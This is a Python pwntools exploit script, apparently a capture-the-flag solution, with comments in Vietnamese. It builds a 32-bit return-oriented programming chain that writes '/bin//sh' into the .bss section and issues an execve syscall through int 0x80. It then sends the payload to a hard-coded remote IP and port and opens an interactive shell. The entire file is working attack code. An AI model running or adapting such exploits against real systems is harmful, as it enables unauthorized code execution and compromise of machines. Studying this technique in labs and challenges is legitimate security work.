# -*- coding: utf-8 -*-

from pwn import *

#Thiết lập các địa chỉ thanh ghi
#0x080481c9 : pop ebx ; ret
pop_ebx_ret = p32(0x080481c9)

#0x08056334 : pop eax ; pop edx ; pop ebx ; ret
pop_eax_edx_ebx_ret = p32(0x08056334)

#0x0806ee91 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = p32(0x0806ee91)

#0x0806ee6b : pop edx ; ret
pop_edx_ret = p32(0x0806ee6b)

#0x08064794 : mov dword ptr [edx], eax ; mov eax, edx ; ret
mov = p32(0x08064794)
int_0x80 = p32(0x08049563) 

#24 .bss   00000cdc  080db320  080db320  0009231c  2**5
bss = p32(0x080db320)
bss_4 = p32(0x080db320 + 4)
bss_16 = p32(0x080db320 + 16)
bss_16_4 = p32(0x080db320 + 16 + 4)

#chèn 28 ký tự
payload = 'A'*28

#lưu giá trị ecx bằng giá trị ptr poiting của section .bss
payload += pop_edx_ecx_ebx_ret
payload += 'N'*4
payload += bss_16
payload += 'N'*4

#Tạo chuỗi /bin/sh
payload += pop_eax_edx_ebx_ret
payload += "/bin"
payload += 'N'*8

payload += pop_edx_ret
payload += bss
payload += mov

#do /sh chỉ có 3bytes nên chèn thêm ký tự /
payload += pop_eax_edx_ebx_ret
payload += "//sh"
payload += 'N'*8

payload += pop_edx_ret
payload += bss_4
payload += mov

#Lưu địa chỉ của chuỗi "/bin/sh" vào bss_16
#bss_16 là giá trị được gán cho thanh ghi ecx
payload += pop_eax_edx_ebx_ret
payload += bss
payload += 'N'*8

payload += pop_edx_ret
payload += bss_16
payload += mov

payload += pop_eax_edx_ebx_ret
payload += p32(0x0)
payload += 'N'*8

payload += pop_edx_ret
payload += bss_16_4
payload += mov

#gán giá trị thanh ghi eax=0xb
payload += pop_eax_edx_ebx_ret
payload += p32(0x0b)
payload += 'N'*8

#gán giá trị thanh ghi edx=0x0
payload += pop_edx_ret
payload += p32(0x0)

#gán giá trị thanh ghi ebx bằng địa chỉ chuỗi "/bin/sh"
payload += pop_ebx_ret
payload += bss

#thực thi syscall
payload += int_0x80

p = remote("45.122.249.68",10007)
p.sendline(payload)
p.interactive()